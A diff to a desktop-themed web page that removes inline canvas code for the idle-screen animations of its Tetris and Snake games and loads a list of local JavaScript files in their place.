-      dctx.clearRect(0,0,dc.width,dc.height);
-
-      // Spawn new piece every ~60 frames
-      spawnTimer++;
-      if(spawnTimer > 55){ spawnTimer=0; spawnDemo(); }
-
-      // Update + draw pieces
-      for(var i=demoPieces.length-1;i>=0;i--){
-        var p = demoPieces[i];
-        p.y += p.speed;
-        p.rot += p.rotSpeed;
-        if(p.y > dc.height + 80){ demoPieces.splice(i,1); continue; }
-
-        dctx.save();
-        var cx = p.x + (p.shape[0].length*BSZ)/2;
-        var cy = p.y + (p.shape.length*BSZ)/2;
-        dctx.translate(cx, cy);
-        dctx.rotate(p.rot);
-        dctx.translate(-cx, -cy);
-
-        p.shape.forEach(function(row,r){
-          row.forEach(function(v,c){
-            if(!v) return;
-            var bx = p.x + c*BSZ;
-            var by = p.y + r*BSZ;
-            // Block fill
-            dctx.fillStyle = p.color;
-            dctx.shadowColor = p.color;
-            dctx.shadowBlur  = 8;
-            dctx.beginPath();
-            dctx.roundRect ? dctx.roundRect(bx+1,by+1,BSZ-2,BSZ-2,2) : dctx.rect(bx+1,by+1,BSZ-2,BSZ-2);
-            dctx.fill();
-            // Shine
-            dctx.shadowBlur = 0;
-            dctx.fillStyle = 'rgba(255,255,255,0.2)';
-            dctx.fillRect(bx+2,by+2,BSZ-4,3);
-          });
-        });
-        dctx.restore();
-      }
-    }
-
-    if(demoAnim) cancelAnimationFrame(demoAnim);
-    demoLoop();
-  }
-
-  // Stop demo when game starts
-  window.stopDemo = function(){
-    if(demoAnim){ cancelAnimationFrame(demoAnim); demoAnim=null; }
-    var dc = document.getElementById('tetDemoCanvas');
-    if(dc){ var c=dc.getContext('2d'); c.clearRect(0,0,dc.width,dc.height); }
-  };
-
-})();
-</script>
-
-
-<script>
-// ════════════════════════════════════════════════════════════════
-// SNAKE DEMO ANIMATION — crawling snake on idle screen
-// ════════════════════════════════════════════════════════════════
-(function(){
-  var demoAnim = null;
-  var snakes   = [];
-  var foods    = [];
-  var CELL     = 18;
-  var dc, dctx, W, H, COLS, ROWS;
-
-  var SNAKE_COLORS = [
-    {head:'#00ff9d', body:'#00cc7a', glow:'rgba(0,255,157,0.6)'},
-    {head:'#00f5ff', body:'#00b8cc', glow:'rgba(0,245,255,0.5)'},
-    {head:'#b06fff', body:'#7a4dcc', glow:'rgba(176,111,255,0.5)'},
-    {head:'#febc2e', body:'#cc960e', glow:'rgba(254,188,46,0.5)'}
-  ];
-
-  function initDemo(){
-    dc = document.getElementById('snakeDemoCanvas');
-    if(!dc) return;
-    var modal = document.getElementById('snakeNameModal');
-    W = modal ? modal.offsetWidth  : 500;
-    H = modal ? modal.offsetHeight : 400;
-    dc.width  = W;
-    dc.height = H;
-    dctx = dc.getContext('2d');
-    COLS = Math.floor(W / CELL);
-    ROWS = Math.floor(H / CELL);
-
-    snakes = [];
-    foods  = [];
-
-    // Spawn 3 snakes crawling around
-    for(var i = 0; i < 3; i++){
-      spawnSnake(i);
-    }
-    // Spawn food pellets
-    for(var f = 0; f < 8; f++){
-      foods.push({
-        x: Math.floor(Math.random() * COLS),
-        y: Math.floor(Math.random() * ROWS)
-      });
-    }
-
-    if(demoAnim) cancelAnimationFrame(demoAnim);
-    var last = 0;
-    var interval = 120; // ms per step
-
-    function loop(ts){
-      var modal = document.getElementById('snakeNameModal');
-      if(!modal || modal.style.display === 'none'){
-        demoAnim = null;
-        return;
-      }
-      demoAnim = requestAnimationFrame(loop);
-      if(ts - last < interval) { drawOnly(); return; }
-      last = ts;
-      stepAll();
-      drawOnly();
-    }
-    demoAnim = requestAnimationFrame(loop);
-  }
-
-  function spawnSnake(colorIdx){
-    var dirs = [{x:1,y:0},{x:-1,y:0},{x:0,y:1},{x:0,y:-1}];
-    var dir  = dirs[Math.floor(Math.random()*dirs.length)];
-    var sx   = Math.floor(3 + Math.random()*(COLS-6));
-    var sy   = Math.floor(3 + Math.random()*(ROWS-6));
-    var len  = 6 + Math.floor(Math.random()*8);
-    var segs = [];
-    for(var i=0;i<len;i++){
-      segs.push({
-        x: ((sx - dir.x*i) + COLS*99) % COLS,
-        y: ((sy - dir.y*i) + ROWS*99) % ROWS
-      });
-    }
-    snakes.push({
-      segs: segs,
-      dir:  dir,
-      color: SNAKE_COLORS[colorIdx % SNAKE_COLORS.length],
-      turnTimer: 0,
-      turnEvery: 8 + Math.floor(Math.random()*12),
-      growing: 0
-    });
-  }
-
-  function stepAll(){
-    snakes.forEach(function(s){
-      // Decide if we should turn
-      s.turnTimer++;
-      if(s.turnTimer >= s.turnEvery){
-        s.turnTimer = 0;
-        s.turnEvery = 6 + Math.floor(Math.random()*14);
-        // Turn left or right (not reverse)
-        var turns = [
-          {x: s.dir.y,  y:-s.dir.x},
-          {x:-s.dir.y,  y: s.dir.x}
-        ];
-        // Sometimes go straight
-        if(Math.random() > 0.35){
-          s.dir = turns[Math.floor(Math.random()*2)];
-        }
-      }
-
-      // Avoid hitting own body (simple lookahead)
-      var nx = (s.segs[0].x + s.dir.x + COLS) % COLS;
-      var ny = (s.segs[0].y + s.dir.y + ROWS) % ROWS;
-      var hits = s.segs.some(function(seg,i){ return i > 0 && seg.x===nx && seg.y===ny; });
-      if(hits){
-        // Try alternate turns
-        var alts = [{x:s.dir.y,y:-s.dir.x},{x:-s.dir.y,y:s.dir.x}];
-        for(var a=0;a<alts.length;a++){
-          var ax = (s.segs[0].x + alts[a].x + COLS) % COLS;
-          var ay = (s.segs[0].y + alts[a].y + ROWS) % ROWS;
-          var ahits = s.segs.some(function(seg,i){ return i>0 && seg.x===ax && seg.y===ay; });
-          if(!ahits){ s.dir = alts[a]; nx=ax; ny=ay; break; }
-        }
-      }
-
-      // Move: add new head
-      s.segs.unshift({x: (s.segs[0].x+s.dir.x+COLS)%COLS, y: (s.segs[0].y+s.dir.y+ROWS)%ROWS});
-
-      // Check food
-      var ate = -1;
-      for(var f=0;f<foods.length;f++){
-        if(foods[f].x===s.segs[0].x && foods[f].y===s.segs[0].y){ ate=f; break; }
-      }
-      if(ate >= 0){
-        foods.splice(ate,1);
-        foods.push({x:Math.floor(Math.random()*COLS), y:Math.floor(Math.random()*ROWS)});
-        s.growing += 3;
-      }
-
-      // Remove tail unless growing
-      if(s.growing > 0){ s.growing--; }
-      else { s.segs.pop(); }
-    });
-  }
-
-  function drawOnly(){
-    dctx.clearRect(0,0,W,H);
-
-    // Subtle grid
-    dctx.strokeStyle = 'rgba(0,255,157,0.04)';
-    dctx.lineWidth = 0.5;
-    for(var c=0;c<=COLS;c++){ dctx.beginPath(); dctx.moveTo(c*CELL,0); dctx.lineTo(c*CELL,H); dctx.stroke(); }
-    for(var r=0;r<=ROWS;r++){ dctx.beginPath(); dctx.moveTo(0,r*CELL); dctx.lineTo(W,r*CELL); dctx.stroke(); }
-
-    // Food
-    foods.forEach(function(f){
-      var fx = f.x*CELL + CELL/2;
-      var fy = f.y*CELL + CELL/2;
-      dctx.save();
-      dctx.shadowColor = '#ff3355';
-      dctx.shadowBlur  = 10;
-      dctx.fillStyle   = '#ff3355';
-      dctx.beginPath();
-      dctx.arc(fx, fy, CELL*0.28, 0, Math.PI*2);
-      dctx.fill();
-      dctx.restore();
-    });
-
-    // Snakes
-    snakes.forEach(function(s){
-      s.segs.forEach(function(seg, i){
-        var x = seg.x*CELL+1;
-        var y = seg.y*CELL+1;
-        var sz = CELL-2;
-        dctx.save();
-
-        if(i === 0){
-          // Head — brighter + glow
-          dctx.shadowColor = s.color.glow;
-          dctx.shadowBlur  = 14;
-          dctx.fillStyle   = s.color.head;
-        } else {
-          // Body — fade out toward tail
-          var fade = 1 - (i / s.segs.length) * 0.6;
-          dctx.globalAlpha = fade;
-          dctx.shadowColor = s.color.glow;
-          dctx.shadowBlur  = 5;
-          dctx.fillStyle   = s.color.body;
-        }
-
-        // Rounded rect
-        var r2 = 3;
-        dctx.beginPath();
-        dctx.moveTo(x+r2, y);
-        dctx.lineTo(x+sz-r2, y);
-        dctx.quadraticCurveTo(x+sz, y, x+sz, y+r2);
-        dctx.lineTo(x+sz, y+sz-r2);
-        dctx.quadraticCurveTo(x+sz, y+sz, x+sz-r2, y+sz);
-        dctx.lineTo(x+r2, y+sz);
-        dctx.quadraticCurveTo(x, y+sz, x, y+sz-r2);
-        dctx.lineTo(x, y+r2);
-        dctx.quadraticCurveTo(x, y, x+r2, y);
-        dctx.closePath();
-        dctx.fill();
-
-        // Eyes on head
-        if(i === 0){
-          dctx.shadowBlur = 0;
-          dctx.fillStyle = '#000';
-          var ex1, ey1, ex2, ey2;
-          var eyeOff = CELL * 0.22;
-          var eyeIn  = CELL * 0.28;
-          if(s.dir.x===1)       { ex1=x+sz*0.7; ey1=y+eyeOff; ex2=x+sz*0.7; ey2=y+sz-eyeOff; }
-          else if(s.dir.x===-1) { ex1=x+sz*0.3; ey1=y+eyeOff; ex2=x+sz*0.3; ey2=y+sz-eyeOff; }
-          else if(s.dir.y===1)  { ex1=x+eyeOff; ey1=y+sz*0.7; ex2=x+sz-eyeOff; ey2=y+sz*0.7; }
-          else                  { ex1=x+eyeOff; ey1=y+sz*0.3; ex2=x+sz-eyeOff; ey2=y+sz*0.3; }
-          dctx.beginPath(); dctx.arc(ex1,ey1,1.8,0,Math.PI*2); dctx.fill();
-          dctx.beginPath(); dctx.arc(ex2,ey2,1.8,0,Math.PI*2); dctx.fill();
-        }
-
-        dctx.restore();
-      });
-    });
-  }
-
-  // Start demo when snake window opens
-  var _snakeOrigOpen = window.openWindow;
-  window.openWindow = function(name){
-    _snakeOrigOpen(name);
-    if(name === 'snake'){
-      setTimeout(function(){
-        var modal = document.getElementById('snakeNameModal');
-        if(modal && modal.style.display !== 'none') initDemo();
-      }, 80);
-    }
-  };
-
-  // Stop demo when game starts (hook into startSnakeGame)
-  var _origStartSnake = window.startSnakeGame;
-  window.startSnakeGame = function(){
-    if(demoAnim){ cancelAnimationFrame(demoAnim); demoAnim=null; }
-    var dc2 = document.getElementById('snakeDemoCanvas');
-    if(dc2){ var c=dc2.getContext('2d'); c.clearRect(0,0,dc2.width,dc2.height); }
-    if(_origStartSnake) _origStartSnake();
-  };
-
-  // Restart demo when player hits "Change Player" (snakeChangeUser goes back to modal)
-  var _origChangeUser = window.snakeChangeUser;
-  window.snakeChangeUser = function(){
-    if(_origChangeUser) _origChangeUser();
-    setTimeout(function(){
-      var modal = document.getElementById('snakeNameModal');
-      if(modal && modal.style.display !== 'none') initDemo();
-    }, 80);
-  };
-
-})();
-</script>
+</div><!-- /#desktop -->
+
+<!-- Scripts (order matters: utilities and state first, boot last) -->
+<script src="js/favicon.js"></script>
+<script src="js/desktop-bg.js"></script>
+<script src="js/windows.js"></script>
+<script src="js/theme.js"></script>
+<script src="js/context-menu.js"></script>
+<script src="js/terminal.js"></script>
+<script src="js/clock.js"></script>
+<script src="js/icon-grid.js"></script>
+<script src="js/tray.js"></script>
+<script src="js/konami.js"></script>
+<script src="js/boot-shutdown.js"></script>
+<script src="js/snake.js"></script>
+<script src="js/tetris.js"></script>
+<script src="js/typingtest.js"></script>
+<script src="js/cursor.js"></script>
+<script src="js/loader.js"></script>
 
 </body>
 </html>
